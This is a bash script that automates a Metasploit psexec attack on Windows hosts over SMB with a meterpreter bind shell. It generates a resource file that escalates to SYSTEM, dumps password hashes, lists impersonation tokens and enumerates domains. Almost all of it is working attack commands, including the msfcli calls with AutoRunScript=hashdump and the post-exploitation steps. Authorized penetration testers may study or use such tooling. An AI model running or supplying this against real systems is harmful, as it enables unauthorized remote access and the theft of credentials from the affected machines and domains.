#!/bin/bash
#Script to launch metasploit psexec and bind shell
#Usage ./script port
# TODO implement favorite modules feature
# by n0b1dy
if [ $# -eq 0 ]; then
echo -e "\033[1m[*]Usage: $0 <target> <bind_port> <optional>{<username> <password> or <ntlmhash>} <workgroup/domain>\033[0m"
echo -e "\033[1m[2]Default password is blank[great]\033[0m"
echo -e "\033[1m[*]Usage: $0 <target> <bind_port> <workstation>(in case of blank password)>\033[0m"
exit
fi

bport=$2
target=$1
username=$3
password=$4
domain=$5
workstation=$3
echo -e "\033[1m ATTENTION You need ADMIN credentials!\033[0m"
echo -e "\033[1m ATTENTION THAT IN DOMAIN CONTROLLER you have to run /post/windows/gather/smart_hashdump and cachedump\033[0m"
echo -e "\033[1m Run 'resource autometerpreter.rc' \033[0m"
if [ $# -eq 3 ];
then
echo -e "\e[1;36m[*]Executing Exploit:psexec against \e[1;31m$target ($workstation)\e[1;36m with blank password[\e[0m"

echo "getsystem" > autometerpreter.rc
echo "migrate -f" >> autometerpreter.rc
echo "run post/windows/gather/smart_hashdump" >> autometerpreter.rc
#echo "run post/windows/gather/cachedump">> autometerpreter.rc
echo "use incognito">> autometerpreter.rc
echo "list_tokens -u">> autometerpreter.rc
#echo "run post/windows/gather/enum_domain_group_users group="Domain Admins"" >> autometerpreter.rc
#echo "run post/windows/gather/enum_domains" >> autometerpreter.rc

echo -e "\e[1;36m[*]resource autometerpreter.rc generated.\e[1;36m"

msfcli exploit/windows/smb/psexec RHOST=$target SMBUser=Administrator LPORT=$bport SMBDomain=$workstation PAYLOAD=windows/meterpreter/bind_tcp E
fi

if [ $# -eq 4 ];
then
echo -e "\\e[1;36m[*]Executing Exploit:psexec against \e[1;31m$target\e[0m with \e[1;31m$username\e[0m and \e[1;31m$password\e[0m"
echo "getsystem" > autometerpreter.rc
echo "run post/windows/gather/smart_hashdump" >> autometerpreter.rc
#echo "run post/windows/gather/cachedump">> autometerpreter.rc
echo "use incognito">> autometerpreter.rc
echo "list_tokens -u">> autometerpreter.rc
#echo "run post/windows/gather/enum_domain_group_users group="Domain Admins"" >> autometerpreter.rc
echo "run post/windows/gather/enum_domains" >> autometerpreter.rc
msfcli exploit/windows/smb/psexec RHOST=$target SMBUser=$username SMBPass=$password LPORT=$bport AutoRunScript=hashdump PAYLOAD=windows/meterpreter/bind_tcp E

fi

if [ $# -eq 5 ];
then
echo -e "\e[1;36m[*]Executing Exploit:psexec against $target with $domain\\$username and $password\036[0m"
echo "getsystem" > autometerpreter.rc
echo "run post/windows/gather/smart_hashdump" >> autometerpreter.rc
#echo "run post/windows/gather/cachedump">> autometerpreter.rc
echo "use incognito">> autometerpreter.rc
echo "list_tokens -u">> autometerpreter.rc
#echo "run post/windows/gather/enum_domain_group_users group="Domain Admins"" >> autometerpreter.rc
echo "run post/windows/gather/enum_domains" >> autometerpreter.rc
msfcli exploit/windows/smb/psexec RHOST=$target SMBUser=$username SMBPass=$password SMBDomain=$domain AutoRunScript=hashdump LPORT=$bport PAYLOAD=windows/meterpreter/bind_tcp E
fi

echo -e "\n\e[1;31m[*]Removing resource autometerpreter.rc - generated.\e[0m"
rm autometerpreter.rc





